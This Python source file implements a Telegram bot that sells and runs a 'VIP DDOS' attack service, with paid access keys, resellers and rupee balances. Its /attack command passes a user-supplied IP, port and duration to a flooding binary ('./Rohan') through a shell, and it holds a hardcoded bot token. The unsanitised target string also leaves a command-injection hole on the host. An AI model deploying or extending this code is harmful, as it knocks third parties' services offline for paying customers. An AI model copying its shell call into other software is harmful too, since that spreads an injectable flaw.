import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
import pytz
import fcntl
import shutil
import re
from typing import Dict, Optional

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('7564493380:AAEjc8jXOqBZAwNNZU8sVyiOoFu8K6vY-cg')  # Replace with your bot token

# Admin user IDs
admin_id = {"1807014348", "6258297180", "6955279265"}  # Replace with your admin Telegram IDs

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
BLOCK_ERROR_LOG = "block_error_log.txt"
KEY_FILE_BACKUP = "keys_backup.json"
ERROR_LOG = "error_log.txt"
COOLDOWN_FILE = "cooldown.json"

# Per key cost for resellers
KEY_COST = {"1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
resellers = {}
last_attack_time = {}
COOLDOWN_PERIOD = 60  # Default cooldown period in seconds

def escape_markdown_v2(text: str) -> str:
    """Escape special MarkdownV2 characters."""
    if not isinstance(text, str):
        return ""
    special_chars = r'_[]()~`>#*+-|=!.{}'
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def set_cooldown(seconds: int) -> None:
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = max(0, seconds)
    with open(COOLDOWN_FILE, "w") as file:
        json.dump({"cooldown": COOLDOWN_PERIOD}, file)

def load_cooldown() -> None:
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        with open(COOLDOWN_FILE, "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = max(0, data.get("cooldown", 60))
    except (FileNotFoundError, json.JSONDecodeError):
        COOLDOWN_PERIOD = 60

def load_data() -> None:
    """Load all data from files with validation."""
    global users, keys, authorized_users, resellers
    try:
        users = validate_users(read_json(USER_FILE, {}))
        keys = validate_keys(read_json(KEY_FILE, {}))
        authorized_users = validate_users(read_json(AUTHORIZED_USERS_FILE, {}))
        resellers = read_json(RESELLERS_FILE, {})
        load_cooldown()
        print(f"Data loaded successfully. Keys: {list(keys.keys())}")
    except Exception as e:
        print(f"Error loading data: {str(e)}")
        users = {}
        keys = {}
        authorized_users = {}
        resellers = {}

def read_json(file_path: str, default: Dict) -> Dict:
    """Read JSON file with locking."""
    try:
        with open(file_path, "r") as file:
            fcntl.flock(file.fileno(), fcntl.LOCK_SH)
            data = json.load(file)
            fcntl.flock(file.fileno(), fcntl.LOCK_UN)
            return data if isinstance(data, dict) else default
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"Error reading {file_path}: {str(e)}")
        return default

def save_json(file_path: str, data: Dict) -> bool:
    """Save JSON file with locking and backup."""
    try:
        if os.path.exists(file_path):
            shutil.copy2(file_path, file_path + "_backup")
        with open(file_path, "w") as file:
            fcntl.flock(file.fileno(), fcntl.LOCK_EX)
            json.dump(data, file, indent=4)
            fcntl.flock(file.fileno(), fcntl.LOCK_UN)
        # Verify
        with open(file_path, "r") as file:
            fcntl.flock(file.fileno(), fcntl.LOCK_SH)
            verified = json.load(file)
            fcntl.flock(file.fileno(), fcntl.LOCK_UN)
            if len(verified) != len(data):
                raise ValueError("Verification failed")
        return True
    except Exception as e:
        print(f"Error saving {file_path}: {str(e)}")
        if os.path.exists(file_path + "_backup"):
            shutil.copy2(file_path + "_backup", file_path)
        return False

def validate_users(data: Dict) -> Dict:
    """Validate user expiration dates."""
    validated = {}
    for user_id, exp in data.items():
        if not isinstance(user_id, str) or not re.match(r'^\d+$', user_id):
            continue
        try:
            datetime.datetime.strptime(exp, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            validated[user_id] = exp
        except (ValueError, TypeError):
            continue
    return validated

def validate_keys(data: Dict) -> Dict:
    """Validate key data structure."""
    validated = {}
    for key, value in data.items():
        if not isinstance(key, str) or not re.match(r'^[a-zA-Z0-9-_]+$', key):
            continue
        if not isinstance(value, dict):
            continue
        validated[key] = {
            "duration": value.get("duration", "1d"),
            "device_limit": max(1, value.get("device_limit", 1)),
            "devices": [str(d) for d in value.get("devices", []) if str(d).isdigit()],
            "blocked": bool(value.get("blocked", False)),
            "generated_time": value.get("generated_time", datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')),
            "generated_by": value.get("generated_by", "Unknown"),
            "blocked_by_username": value.get("blocked_by_username", "N/A"),
            "blocked_time": value.get("blocked_time", "N/A")
        }
    return validated

def parse_duration(duration_str: str) -> tuple:
    """Parse duration string (e.g., 1h, 1d, 1m)."""
    duration_str = duration_str.lower().replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([hdm])", duration_str)
    return (int(match.group(1)), match.group(2)) if match else (0, "")

def add_time_to_current_date(hours=0, days=0, months=0) -> datetime.datetime:
    """Add time to the current date."""
    current_time = datetime.datetime.now(IST)
    return current_time + relativedelta(months=months, days=days, hours=hours)

def log_command(user_id: str, target: str, port: str, time: str) -> None:
    """Log attack command details without affecting responses."""
    try:
        log_entry = f"UserID: {user_id} Target: {target} Port: {port} Time: {time} Date: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}\n"
        with open(LOG_FILE, "a") as file:
            file.write(log_entry)
    except Exception as e:
        with open(ERROR_LOG, "a") as log:
            log.write(f"Log error at {datetime.datetime.now(IST)}: {str(e)}\n")

def execute_attack(target: str, port: int, time: int, chat_id: int, username: str, last_attack_time: Dict, user_id: str) -> None:
    """Execute an attack command with escaped response."""
    try:
        packet_size = 1200
        full_command = f"./Rohan {target} {port} {time} {packet_size}"
        response = (
            f"Attack Sent\n"
            f"Target: {escape_markdown_v2(target)}:{port}\n"
            f"Time: {time}s\n"
            f"Packet Size: {packet_size} bytes\n"
            f"Threads: 512\n"
            f"Attacker: @{escape_markdown_v2(username)}"
        )
        bot.send_message(chat_id, response, parse_mode='MarkdownV2')
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, lambda: bot.send_message(chat_id, "Attack completed"), []).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
    except Exception as e:
        error_msg = f"Error executing attack: {escape_markdown_v2(str(e))}"
        bot.send_message(chat_id, error_msg, parse_mode='MarkdownV2')
        with open(ERROR_LOG, "a") as log:
            log.write(f"Attack error at {datetime.datetime.now(IST)}: {str(e)}\n")

# Command handlers
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    has_access = user_id in admin_id or user_id in users or user_id in authorized_users
    response = f"WELCOME TO VIP DDOS\nUse /help for commands"
    if not has_access:
        response += f"\nRedeem a key with /redeem <key> or contact @{escape_markdown_v2('Rahul_618')} for access"
    bot.send_message(message.chat.id, escape_markdown_v2(response), parse_mode='MarkdownV2')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    help_text = (
        f"*VIP DDOS HELP*\n"
        f"/start - Start bot\n"
        f"/help - Show this\n"
        f"/attack <ip> <port> <time> - Launch attack\n"
        f"/setcooldown <seconds> - Set cooldown\n"
        f"/checkcooldown - View cooldown\n"
        f"/addreseller <id> <balance> - Add reseller\n"
        f"/genkey <duration> <name> - Generate key\n"
        f"/logs - View logs\n"
        f"/users - List users\n"
        f"/add <id> - Add user\n"
        f"/remove <id> - Remove user\n"
        f"/resellers - View resellers\n"
        f"/addbalance <id> <amount> - Add reseller balance\n"
        f"/removereseller <id> - Remove reseller\n"
        f"/block <key> - Block key\n"
        f"/redeem <key> - Redeem key\n"
        f"/balance - Check balance (resellers)\n"
        f"/myinfo - View info\n"
        f"/listkeys - List keys\n"
        f"Contact @{escape_markdown_v2('Rahul_618')} for issues"
    )
    send_safe_message(message.chat.id, help_text)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    if user_id not in resellers:
        bot.send_message(message.chat.id, "Access Denied: Reseller only")
        return
    response = f"Balance: {resellers[user_id]} Rs"
    bot.send_message(message.chat.id, escape_markdown_v2(response), parse_mode='MarkdownV2')

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    if user_id in admin_id or (user_id in authorized_users and not users.get(user_id)):
        bot.send_message(message.chat.id, "No key needed for admins/authorized users")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(message.chat.id, "Usage: /redeem <key>")
        return
    key = parts[1].strip()
    if user_id in users:
        try:
            exp = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp:
                bot.send_message(message.chat.id, f"Active key expires: {exp.strftime('%Y-%m-%d %I:%M:%S %p')}")
                return
            del users[user_id]
        except ValueError:
            pass
    if key in keys and not keys[key].get("blocked", False) and len(keys[key]["devices"]) < keys[key]["device_limit"]:
        if user_id in keys[key]["devices"]:
            bot.send_message(message.chat.id, "Key already redeemed")
            return
        hours, unit = parse_duration(keys[key]["duration"])
        if unit == "h":
            exp = add_time_to_current_date(hours=hours)
        elif unit == "d":
            exp = add_time_to_current_date(days=hours)
        elif unit == "m":
            exp = add_time_to_current_date(months=hours)
        else:
            bot.send_message(message.chat.id, "Invalid duration")
            return
        users[user_id] = exp.strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key]["devices"].append(user_id)
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            del keys[key]
        save_json(USER_FILE, users)
        save_json(KEY_FILE, keys)
        bot.send_message(message.chat.id, f"Key redeemed! Expires: {exp.strftime('%Y-%m-%d %I:%M:%S %p')}")
    else:
        bot.send_message(message.chat.id, f"Invalid or blocked key. Contact @{escape_markdown_v2('Rahul_618')}")

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(message.chat.id, "Usage: /block <key>")
        return
    key = parts[1].strip()
    if key in keys:
        if keys[key].get("blocked", False):
            bot.send_message(message.chat.id, f"Key already blocked by @{escape_markdown_v2(keys[key]['blocked_by_username'])} on {keys[key]['blocked_time']}")
            return
        try:
            chat = bot.get_chat(user_id)
            blocker = chat.username or f"UserID_{user_id}"
        except Exception:
            blocker = f"UserID_{user_id}"
        keys[key]["blocked"] = True
        keys[key]["blocked_by_username"] = blocker
        keys[key]["blocked_time"] = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        save_json(KEY_FILE, keys)
        bot.send_message(message.chat.id, f"Key {key} blocked by @{escape_markdown_v2(blocker)} on {keys[key]['blocked_time']}")
    else:
        with open(BLOCK_ERROR_LOG, "a") as log:
            log.write(f"Block attempt on {key} failed at {datetime.datetime.now(IST)}\n")
        bot.send_message(message.chat.id, f"Key {key} not found")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(message.chat.id, "Usage: /add <id>")
        return
    target_id = parts[1]
    if target_id in authorized_users:
        bot.send_message(message.chat.id, f"User {target_id} already authorized")
        return
    exp = add_time_to_current_date(months=1)
    authorized_users[target_id] = exp.strftime('%Y-%m-%d %I:%M:%S %p')
    save_json(AUTHORIZED_USERS_FILE, authorized_users)
    bot.send_message(message.chat.id, f"User {target_id} authorized until {exp.strftime('%Y-%m-%d %I:%M:%S %p')}")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "rb") as file:
            bot.send_document(message.chat.id, file)
    else:
        bot.send_message(message.chat.id, "No logs found")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    has_access = user_id in admin_id or user_id in users or user_id in authorized_users
    if not has_access:
        bot.send_message(message.chat.id, f"Unauthorized. Contact @{escape_markdown_v2('Rahul_618')} for access")
        return
    if user_id in last_attack_time:
        cooldown = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if cooldown < COOLDOWN_PERIOD:
            bot.send_message(message.chat.id, f"Cooldown: {int(COOLDOWN_PERIOD - cooldown)}s remaining")
            return
    parts = message.text.split()
    if len(parts) != 4:
        bot.send_message(message.chat.id, "Usage: /attack <ip> <port> <time>")
        return
    target, port, time = parts[1], int(parts[2]), int(parts[3])
    if time > 900:
        bot.send_message(message.chat.id, "Time must be < 900s")
        return
    log_command(user_id, target, port, time)
    username = message.from_user.username or f"UserID_{user_id}"
    execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(message.chat.id, "Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(parts[1])
        set_cooldown(seconds)
        bot.send_message(message.chat.id, f"Cooldown set to {seconds}s")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid number")

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    bot.send_message(message.chat.id, f"Cooldown: {COOLDOWN_PERIOD}s")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    try:
        chat = bot.get_chat(user_id)
        username = chat.username or "No username"
    except Exception:
        username = "No username"
    role = "Guest"
    exp = "N/A"
    key = "None"
    if user_id in admin_id:
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"
    elif user_id in users:
        role = "User"
        exp = users[user_id]
        key = next((k for k, v in keys.items() if user_id in v["devices"] and not v["blocked"]), "None")
    elif user_id in authorized_users:
        role = "Authorized User"
        exp = authorized_users[user_id]
    response = f"Info\nUsername: @{escape_markdown_v2(username)}\nID: {user_id}\nRole: {role}\nExpiration: {exp}\nKey: {key}"
    if role == "Reseller":
        response += f"\nBalance: {resellers[user_id]} Rs"
    bot.send_message(message.chat.id, escape_markdown_v2(response), parse_mode='MarkdownV2')

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    all_users = {**users, **authorized_users}
    response = "Users\n"
    for uid, exp in all_users.items():
        try:
            chat = bot.get_chat(uid)
            name = chat.username or chat.first_name or "Unknown"
        except Exception:
            name = f"Unknown (ID: {uid})"
        response += f"ID: {uid}\nName: @{escape_markdown_v2(name)}\nExpires: {exp}\n"
    bot.send_message(message.chat.id, escape_markdown_v2(response), parse_mode='MarkdownV2')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(message.chat.id, "Usage: /remove <id>")
        return
    target_id = parts[1]
    if target_id in users:
        del users[target_id]
        save_json(USER_FILE, users)
        bot.send_message(message.chat.id, f"Removed {target_id} from users")
    elif target_id in authorized_users:
        del authorized_users[target_id]
        save_json(AUTHORIZED_USERS_FILE, authorized_users)
        bot.send_message(message.chat.id, f"Removed {target_id} from authorized")
    else:
        bot.send_message(message.chat.id, f"User {target_id} not found")

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    response = "Resellers\n"
    for rid, balance in resellers.items():
        try:
            chat = bot.get_chat(rid)
            name = chat.username or "Unknown"
        except Exception:
            name = f"Unknown (ID: {rid})"
        response += f"ID: {rid}\nName: @{escape_markdown_v2(name)}\nBalance: {balance} Rs\n"
    bot.send_message(message.chat.id, escape_markdown_v2(response), parse_mode='MarkdownV2')

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.send_message(message.chat.id, "Usage: /addbalance <id> <amount>")
        return
    rid, amount = parts[1], float(parts[2])
    if rid not in resellers:
        bot.send_message(message.chat.id, "Reseller not found")
        return
    resellers[rid] += amount
    save_json(RESELLERS_FILE, resellers)
    bot.send_message(message.chat.id, f"Added {amount} Rs to {rid}. New balance: {resellers[rid]} Rs")

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(message.chat.id, "Usage: /removereseller <id>")
        return
    rid = parts[1]
    if rid in resellers:
        del resellers[rid]
        save_json(RESELLERS_FILE, resellers)
        bot.send_message(message.chat.id, f"Removed reseller {rid}")
    else:
        bot.send_message(message.chat.id, "Reseller not found")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id and user_id not in resellers:
        bot.send_message(message.chat.id, "Access Denied: Admin/reseller only")
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.send_message(message.chat.id, "Usage: /genkey <duration> <name>")
        return
    duration, key_name = parts[1].lower(), parts[2]
    if not re.match(r'^[a-zA-Z0-9-]+$', key_name):
        bot.send_message(message.chat.id, "Invalid key name")
        return
    hours, unit = parse_duration(duration)
    if not hours or unit not in "hdm":
        bot.send_message(message.chat.id, "Invalid duration (use 1h, 1d, 1m)")
        return
    cost_key = f"{hours}{unit}"
    cost = KEY_COST.get(cost_key, 0)
    if user_id in resellers and resellers[user_id] < cost:
        bot.send_message(message.chat.id, "Insufficient balance")
        return
    custom_key = f"Rahul_sadiq-{key_name}"
    if custom_key in keys:
        bot.send_message(message.chat.id, f"Key {custom_key} exists")
        return
    try:
        chat = bot.get_chat(user_id)
        generated_by = chat.username or f"UserID_{user_id}"
    except Exception:
        generated_by = f"UserID_{user_id}"
    keys[custom_key] = {
        "duration": duration,
        "device_limit": 1,
        "devices": [],
        "blocked": False,
        "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        "generated_by": generated_by
    }
    if not save_json(KEY_FILE, keys):
        bot.send_message(message.chat.id, "Error saving key")
        return
    if user_id in resellers:
        resellers[user_id] -= cost
        save_json(RESELLERS_FILE, resellers)
    response = f"Key generated\nKey: {custom_key}\nDuration: {duration}\nLimit: 1\nBy: @{escape_markdown_v2(generated_by)}\nTime: {keys[custom_key]['generated_time']}"
    if cost > 0:
        response += f"\nCost: {cost} Rs\nBalance: {resellers[user_id]} Rs"
    bot.send_message(message.chat.id, escape_markdown_v2(response), parse_mode='MarkdownV2')

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.send_message(message.chat.id, "Usage: /addreseller <id> <balance>")
        return
    rid, balance = parts[1], int(parts[2])
    if rid in resellers:
        bot.send_message(message.chat.id, f"Reseller {rid} exists")
        return
    resellers[rid] = balance
    save_json(RESELLERS_FILE, resellers)
    bot.send_message(message.chat.id, f"Added reseller {rid} with {balance} Rs")

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "Access Denied: Admin only")
        return
    global keys
    keys = validate_keys(read_json(KEY_FILE, {}))
    response = "Key List\n"
    if keys:
        for key_name, key_data in sorted(keys.items()):
            try:
                generated_by = key_data.get("generated_by", "Unknown")
                generated_time = key_data.get("generated_time", "Unknown")
                devices = key_data.get("devices", [])
                blocked = key_data.get("blocked", False)
                active = any(d in users and datetime.datetime.now(IST) < datetime.datetime.strptime(users[d], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST) for d in devices) and not blocked
                status = "Active" if active else "Inactive"
                device_details = "\n".join(
                    f"  ID: {d}\n  Name: @{escape_markdown_v2(get_username(d) or f'Unknown (ID: {d})')}\n  Exp: {users.get(d, 'N/A')}"
                    for d in devices if str(d).isdigit()
                ) or "No users"
                blocker = escape_markdown_v2(key_data.get("blocked_by_username", "N/A"))
                block_time = key_data.get("blocked_time", "N/A")
                response += (
                    f"Key: {key_name}\n"
                    f"By: @{escape_markdown_v2(generated_by)}\n"
                    f"Time: {generated_time}\n"
                    f"Dur: {key_data['duration']}\n"
                    f"Limit: {key_data['device_limit']}\n"
                    f"Devices:\n{device_details}\n"
                    f"Status: {status}\n"
                    f"Blocked: {blocked}\n"
                    f"By: @{blocker}\n"
                    f"Time: {block_time}\n\n"
                )
            except Exception as e:
                response += f"Key: {key_name}\nError: {str(e)}\n\n"
                with open(ERROR_LOG, "a") as log:
                    log.write(f"Key {key_name} error at {datetime.datetime.now(IST)}: {str(e)}\n")
    else:
        response = "No keys"
    send_safe_message(message.chat.id, response)

def get_username(user_id: str) -> Optional[str]:
    """Get username with retry logic."""
    for attempt in range(3):
        try:
            chat = bot.get_chat(user_id)
            return chat.username
        except telebot.apihelper.ApiException as e:
            if "Too Many Requests" in str(e):
                time.sleep(2 ** attempt)
            elif "chat not found" in str(e):
                return None
            else:
                raise
    return None

def send_safe_message(chat_id: int, text: str) -> None:
    """Send message with splitting and retry."""
    max_length = 3800
    if len(text) > max_length:
        parts = [text[i:i + max_length] for i in range(0, len(text), max_length)]
        for i, part in enumerate(parts):
            for attempt in range(3):
                try:
                    time.sleep(1)
                    bot.send_message(chat_id, escape_markdown_v2(part), parse_mode='MarkdownV2')
                    break
                except telebot.apihelper.ApiException as e:
                    with open(ERROR_LOG, "a") as log:
                        log.write(f"Part {i+1} error at {datetime.datetime.now(IST)}: {str(e)}\n")
                    if attempt == 2:
                        bot.send_message(chat_id, "Error occurred")
                    time.sleep(2 ** attempt)
    else:
        for attempt in range(3):
            try:
                bot.send_message(chat_id, escape_markdown_v2(text), parse_mode='MarkdownV2')
                break
            except telebot.apihelper.ApiException as e:
                with open(ERROR_LOG, "a") as log:
                    log.write(f"Message error at {datetime.datetime.now(IST)}: {str(e)}\n")
                if attempt == 2:
                    bot.send_message(chat_id, "Error occurred")
                time.sleep(2 ** attempt)

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {str(e)}")
            time.sleep(5)